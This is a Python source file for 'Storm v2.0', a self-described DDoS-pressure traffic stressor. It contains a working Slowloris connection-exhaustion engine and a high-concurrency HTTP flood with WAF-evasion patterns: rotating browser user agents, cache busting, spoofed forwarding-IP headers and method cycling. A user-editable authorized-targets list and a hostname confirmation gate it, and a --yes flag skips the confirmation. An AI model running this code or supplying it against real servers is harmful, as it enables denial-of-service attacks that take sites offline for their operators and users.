import argparse
import concurrent.futures
import json
import math
import os
import random
import re
import socket
import statistics
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool
from privacy_guard import privacy_user_agent, sanitize_text

LOCAL_HOSTS = {"localhost", "127.0.0.1", "::1"}

# ── UA pool: 16 real browser fingerprints for rotation ──────────────────────
_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.72 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.56 Safari/537.36 OPR/112.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Vivaldi/6.8",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "curl/8.7.1",  # also rotates in a non-browser agent to test WAF detection gap
]

# ── Random header flood fragments ────────────────────────────────────────────
_JUNK_HEADERS = [
    ("X-Forwarded-For", lambda: f"198.51.100.{random.randint(1,254)}"),
    ("X-Real-IP",       lambda: f"203.0.113.{random.randint(1,254)}"),
    ("X-Request-ID",    lambda: hex(random.getrandbits(64))[2:]),
    ("X-Trace-ID",      lambda: hex(random.getrandbits(64))[2:]),
    ("CF-Connecting-IP",lambda: f"192.0.2.{random.randint(1,254)}"),
    ("X-Client-Version",lambda: f"1.{random.randint(0,99)}.{random.randint(0,99)}"),
    ("Accept-Language", lambda: random.choice(["en-US,en;q=0.9","fr-FR,fr;q=0.9","de-DE,de;q=0.8","zh-CN,zh;q=0.7","ja-JP,ja;q=0.6"])),
    ("Cache-Control",   lambda: random.choice(["no-cache","no-store","max-age=0","must-revalidate"])),
]

_HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT"]


def _is_local_target(url):
    parsed = urllib.parse.urlparse(url)
    return parsed.hostname in LOCAL_HOSTS


def _load_authorized_hosts():
    hosts = set()
    here = os.path.dirname(os.path.abspath(__file__))
    for _ in range(6):
        candidate = os.path.join(here, "authorized_targets.txt")
        if os.path.isfile(candidate):
            try:
                with open(candidate, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith("#") or "*" in line or "?" in line:
                            continue
                        host = line
                        if "://" in host:
                            host = urllib.parse.urlparse(host).hostname or host
                        host = host.split("/")[0].strip().lower()
                        if "@" in host: host = host.split("@")[-1]
                        if host.count(":") == 1: host = host.split(":")[0]
                        if host: hosts.add(host)
            except OSError:
                pass
            break
        parent = os.path.dirname(here)
        if parent == here: break
        here = parent
    return hosts


def _is_authorized_target(url):
    parsed = urllib.parse.urlparse(url)
    host = (parsed.hostname or "").lower()
    if host in LOCAL_HOSTS: return True
    return host in _load_authorized_hosts()


def _join_url(base_url, path):
    return urllib.parse.urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))


def _build_headers(pattern="default", seq=0):
    """Build request headers according to the chosen flood pattern."""
    ua = _UA_POOL[seq % len(_UA_POOL)] if pattern == "ua-rotate" else _UA_POOL[0]
    hdrs = {
        "User-Agent":      ua,
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-CH-UA":       '"Chromium";v="128", "Not;A=Brand";v="24"',
        "Sec-CH-UA-Mobile":"?0",
        "Sec-Fetch-Dest":  "document",
        "Sec-Fetch-Mode":  "navigate",
        "Sec-Fetch-Site":  "none",
    }
    if pattern == "cache-bust":
        hdrs["Cache-Control"] = "no-cache, no-store"
        hdrs["Pragma"] = "no-cache"
        hdrs["X-Cache-Bust"] = str(seq)
    elif pattern == "header-flood":
        # Spray random headers — taxes header parsing / WAF inspection
        for hdr_name, hdr_val_fn in random.sample(_JUNK_HEADERS, k=min(len(_JUNK_HEADERS), 6)):
            hdrs[hdr_name] = hdr_val_fn()
    return hdrs


def _request(target_url, method="GET", body=None, timeout=5, pattern="default", seq=0):
    headers = _build_headers(pattern, seq)
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = body if isinstance(body, bytes) else json.dumps(body).encode("utf-8")
    # Cache-bust URL if requested
    if pattern == "cache-bust":
        sep = "&" if "?" in target_url else "?"
        target_url = f"{target_url}{sep}_s={seq}"

    started = time.perf_counter()
    try:
        req = urllib.request.Request(target_url, method=method, data=data, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            r.read(512)
            return r.getcode(), time.perf_counter() - started, ""
    except urllib.error.HTTPError as e:
        e.read(512)
        return e.code, time.perf_counter() - started, ""
    except Exception as e:
        return 0, time.perf_counter() - started, str(e)


# ── Slowloris engine ─────────────────────────────────────────────────────────

def _slowloris_worker(host, port, path, use_ssl, keep_alive_sec, stop_event, counter):
    """
    Open one TCP connection, send a partial HTTP/1.1 request, then drip one
    header byte every `keep_alive_sec` seconds to keep the connection open
    without completing the request.  Ties up one server thread/connection slot.
    """
    try:
        sock = socket.create_connection((host, port), timeout=10)
        if use_ssl:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)

        ua = random.choice(_UA_POOL)
        # Send a partial request — no terminal \r\n\r\n so the server waits
        partial = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Connection: keep-alive\r\n"
        ).encode("utf-8")
        sock.send(partial)
        with counter["lock"]:
            counter["open"] += 1

        while not stop_event.is_set():
            time.sleep(keep_alive_sec)
            try:
                # Drip one more header — never closes the request
                junk_hdr = f"X-Keepalive-{random.randint(1000,9999)}: {random.randint(1,999)}\r\n"
                sock.send(junk_hdr.encode("utf-8"))
            except Exception:
                break
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass
        with counter["lock"]:
            counter["open"] = max(0, counter["open"] - 1)


def run_slowloris(base_url, connections, duration, keep_alive_sec=10):
    tool = VibeTool("Storm", "Slowloris Connection Exhaustion")
    tool.banner()

    if not _is_authorized_target(base_url):
        tool.log("Target not authorized. Add to authorized_targets.txt first.", "fail")
        return 2

    parsed = urllib.parse.urlparse(base_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    use_ssl = parsed.scheme == "https"

    tool.log(
        f"SLOWLORIS — {connections} connections → {host}:{port}{path} "
        f"| drip every {keep_alive_sec}s | duration {duration}s",
        "warn",
    )

    stop_event = threading.Event()
    counter = {"open": 0, "lock": threading.Lock()}
    threads = []

    for _ in range(connections):
        t = threading.Thread(
            target=_slowloris_worker,
            args=(host, port, path, use_ssl, keep_alive_sec, stop_event, counter),
            daemon=True,
        )
        threads.append(t)
        t.start()
        time.sleep(0.05)  # stagger connection opening

    start = time.perf_counter()
    try:
        while time.perf_counter() - start < duration:
            with counter["lock"]:
                open_count = counter["open"]
            tool.log(f"  [{time.perf_counter()-start:.1f}s] open connections: {open_count}/{connections}")
            time.sleep(5)
    except KeyboardInterrupt:
        pass

    stop_event.set()
    for t in threads:
        t.join(timeout=2)

    tool.log(f"Slowloris complete. Held up to {connections} connections for {duration}s.", "hack")
    return 0


# ── URL check ────────────────────────────────────────────────────────────────

def _check_url(target_url, timeout=8):
    headers = {"User-Agent": privacy_user_agent("Storm"), "Accept": "text/html,application/json,*/*"}
    started = time.perf_counter()
    try:
        req = urllib.request.Request(target_url, method="GET", headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            content = r.read(120_000).decode("utf-8", errors="ignore")
            title = re.sub(r"\s+", " ", (re.search(r"<title[^>]*>(.*?)</title>", content, re.I | re.S) or type("", (), {"group": lambda s, n: ""})()).group(1)).strip()[:120]
            return {"url": target_url, "status": r.getcode(), "latency_ms": (time.perf_counter()-started)*1000,
                    "title": title, "server": r.headers.get("Server",""), "content_type": r.headers.get("Content-Type",""), "error": ""}
    except urllib.error.HTTPError as e:
        e.read(512)
        return {"url": target_url, "status": e.code, "latency_ms": (time.perf_counter()-started)*1000,
                "title": "", "server": e.headers.get("Server",""), "content_type": e.headers.get("Content-Type",""), "error": ""}
    except Exception as e:
        return {"url": target_url, "status": 0, "latency_ms": (time.perf_counter()-started)*1000,
                "title": "", "server": "", "content_type": "", "error": str(e)}


def _load_urls(single_url, urls_file):
    urls = []
    if single_url: urls.append(single_url)
    if urls_file:
        with open(urls_file, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"): urls.append(line)
    return urls


def run_url_check(urls, timeout):
    tool = VibeTool("Storm", "URL Availability Tester")
    tool.banner()
    if not urls: tool.log("No URLs provided.", "fail"); return 2
    bad = [u for u in urls if urllib.parse.urlparse(u).scheme not in {"http","https"}]
    if bad: tool.log(f"Refusing unsupported schemes: {bad[:3]}", "fail"); return 2
    tool.log(f"Checking {len(urls)} URL(s).")
    failures = 0
    for url in urls:
        r = _check_url(url, timeout=timeout)
        st = r["status"]
        level = "crit" if st == 0 or st >= 500 else ("warn" if st >= 400 else "pass")
        if level == "crit": failures += 1
        tool.log(f"{url} → {st} {r['latency_ms']:.1f}ms {r.get('error','')}", level)
    if failures: tool.log(f"{failures} hard failure(s).", "crit"); return 1
    tool.log("All URLs OK.", "pass"); return 0


# ── Main storm ───────────────────────────────────────────────────────────────

def _build_plan(base_url, include_chat=False, pattern="default"):
    """Build request plan. method-cycle pattern rotates HTTP methods."""
    paths = ["/", "/index.html", "/dashboard.html", "/landing.html", "/api/config"]
    plan = []
    for i, p in enumerate(paths):
        method = _HTTP_METHODS[i % len(_HTTP_METHODS)] if pattern == "method-cycle" else "GET"
        plan.append((method, _join_url(base_url, p), None))
    plan.append(("POST", _join_url(base_url, "/api/chat"), b"{bad-json"))
    if include_chat:
        plan.append(("POST", _join_url(base_url, "/api/chat"), {
            "messages": [{"role": "user", "content": "VibeStorm ping"}],
            "model": "nvidia/nemotron-3-super-120b-a12b:free",
            "persona": "default", "stream": False,
        }))
    return plan


def _confirm_external(host):
    print("=" * 64)
    print(f"  ⚠  EXTERNAL TARGET — ACTIVE LOAD TEST → {sanitize_text(host)}")
    print("  Only target hosts you own or have explicit written authorization to test.")
    print("=" * 64)
    try: return input(f"  Type the hostname ({host}) to proceed: ").strip().lower() == host.lower()
    except EOFError: return False


def run_storm(base_url, duration, entries_per_min, concurrency, include_chat,
              timeout, full_send, pattern="default", assume_yes=False):
    tool = VibeTool("Storm", "Traffic Stressor")
    tool.banner()

    if not _is_authorized_target(base_url):
        tool.log("Target not authorized. Add to authorized_targets.txt first.", "fail"); return 2
    if not _is_local_target(base_url):
        tool.log("Authorized external target.", "warn")
        host = (urllib.parse.urlparse(base_url).hostname or "").lower()
        if not assume_yes and not _confirm_external(host):
            tool.log("Aborted.", "fail"); return 3

    duration = max(1, int(duration))
    entries_per_min = max(1, int(entries_per_min))
    concurrency = max(1, int(concurrency))
    interval = 0 if full_send else 60.0 / entries_per_min
    total_budget = max(1, int(entries_per_min * (duration / 60.0)))
    plan = _build_plan(base_url, include_chat=include_chat, pattern=pattern)

    tool.log(
        f"Target={base_url} | duration={duration}s | "
        f"rate={'∞' if full_send else entries_per_min}/min | "
        f"concurrency={concurrency} | pattern={pattern}"
    )

    pre_status, pre_latency, pre_err = _request(base_url, timeout=timeout)
    if pre_status == 0:
        tool.log(f"Preflight failed: {pre_err}", "fail"); return 1
    tool.log(f"Preflight: HTTP {pre_status} {pre_latency*1000:.1f}ms", "pass")

    results = []
    errors = {}
    seq_counter = 0

    def _do_req(method, url, body, seq):
        return _request(url, method, body, timeout, pattern=pattern, seq=seq)

    next_at = time.perf_counter()
    started = time.perf_counter()
    submitted = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as pool:
        futures = {}
        while (full_send or submitted < total_budget) and time.perf_counter() - started < duration:
            # drain done futures
            done_futs = [f for f in list(futures) if f.done()]
            for f in done_futs:
                st, lat, err = f.result()
                results.append((st, lat))
                if err: errors[err] = errors.get(err, 0) + 1
                del futures[f]

            if len(futures) < concurrency:
                method, url, body = plan[submitted % len(plan)]
                seq_counter += 1
                fut = pool.submit(_do_req, method, url, body, seq_counter)
                futures[fut] = True
                submitted += 1
                if not full_send:
                    next_at += interval
                    delay = next_at - time.perf_counter()
                    if delay > 0: time.sleep(delay)
            else:
                time.sleep(0.001)

        for f in concurrent.futures.as_completed(futures):
            st, lat, err = f.result()
            results.append((st, lat))
            if err: errors[err] = errors.get(err, 0) + 1

    elapsed = max(0.001, time.perf_counter() - started)
    post_status, post_latency, post_err = _request(base_url, timeout=timeout)

    statuses = {}
    latencies = []
    for st, lat in results:
        statuses[st] = statuses.get(st, 0) + 1
        latencies.append(lat * 1000)

    rate = len(results) / elapsed
    p50 = statistics.median(latencies) if latencies else 0
    stdev = statistics.stdev(latencies) if len(latencies) > 1 else 0
    ordered = sorted(latencies) if latencies else []
    p95 = ordered[min(len(ordered)-1, max(0, math.ceil(0.95*len(ordered))-1))] if ordered else 0
    p99 = ordered[min(len(ordered)-1, max(0, math.ceil(0.99*len(ordered))-1))] if ordered else 0
    mx  = ordered[-1] if ordered else 0

    tool.log(f"Requests: {len(results)} in {elapsed:.1f}s → {rate:.1f} req/s")
    tool.log(f"Status codes: {statuses}")
    tool.log(f"Latency ms: p50={p50:.1f} p95={p95:.1f} p99={p99:.1f} σ={stdev:.1f} max={mx:.1f}")
    if errors:
        tool.log(f"Transport errors: {sorted(errors.items(), key=lambda x:-x[1])[:5]}", "warn")

    if post_status == 0:
        tool.log(f"Post-stress health FAILED: {post_err}", "crit"); return 1
    slowdown = post_latency / pre_latency if pre_latency > 0 else 0
    level = "crit" if post_status >= 500 or slowdown >= 5 else "pass"
    tool.log(f"Post-stress: HTTP {post_status} {post_latency*1000:.1f}ms (slowdown {slowdown:.1f}x)", level)
    return 0


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Storm v2.0 — DDoS-Pressure Traffic Stressor")
    parser.add_argument("--url", default="", help="Target URL (localhost or in authorized_targets.txt)")
    parser.add_argument("--urls-file", default="", help="File of URLs for --url-check mode")
    parser.add_argument("--url-check", action="store_true", help="One-request-per-URL availability check")

    # ── Core stress params ──
    parser.add_argument("--duration",        type=int,   default=30,   help="Duration in seconds (default: 30)")
    parser.add_argument("--entries-per-min", type=int,   default=6000, help="Requests/min in paced mode (default: 6000)")
    # RAISED from 20 → 512
    parser.add_argument("--concurrency",     type=int,   default=512,  help="Concurrent workers (default: 512)")
    parser.add_argument("--timeout",         type=float, default=5,    help="Per-request timeout seconds (default: 5)")
    parser.add_argument("--full-send",       action="store_true",      help="Ignore pacing — maximum pressure")
    parser.add_argument("--include-chat",    action="store_true",      help="Include valid /api/chat payloads")
    parser.add_argument("--yes",             action="store_true",      help="Skip external-target confirmation")

    # ── Flood pattern ──
    parser.add_argument("--pattern", default="default",
                        choices=["default", "ua-rotate", "cache-bust", "header-flood", "method-cycle"],
                        help="Flood pattern (default: default). ua-rotate cycles 16 browser UAs. "
                             "cache-bust appends unique tokens to defeat edge caches. "
                             "header-flood sprays random headers to tax WAF inspection. "
                             "method-cycle rotates GET/POST/HEAD/OPTIONS/PUT.")

    # ── Slowloris ──
    parser.add_argument("--slowloris",        type=int, default=0,
                        help="Slowloris mode: open N TCP connections and hold them (default: off)")
    parser.add_argument("--slowloris-drip",   type=float, default=10,
                        help="Seconds between drip bytes in slowloris mode (default: 10)")

    parser.add_argument("-v", "--version", action="version", version="Storm 2.0.0")
    args = parser.parse_args()

    if args.url_check or args.urls_file:
        raise SystemExit(run_url_check(_load_urls(args.url, args.urls_file), args.timeout))

    if args.slowloris > 0:
        raise SystemExit(run_slowloris(
            args.url or "http://localhost:3456/",
            args.slowloris,
            args.duration,
            args.slowloris_drip,
        ))

    raise SystemExit(run_storm(
        args.url or "http://localhost:3456/",
        args.duration,
        args.entries_per_min,
        args.concurrency,
        args.include_chat,
        args.timeout,
        args.full_send,
        pattern=args.pattern,
        assume_yes=args.yes,
    ))
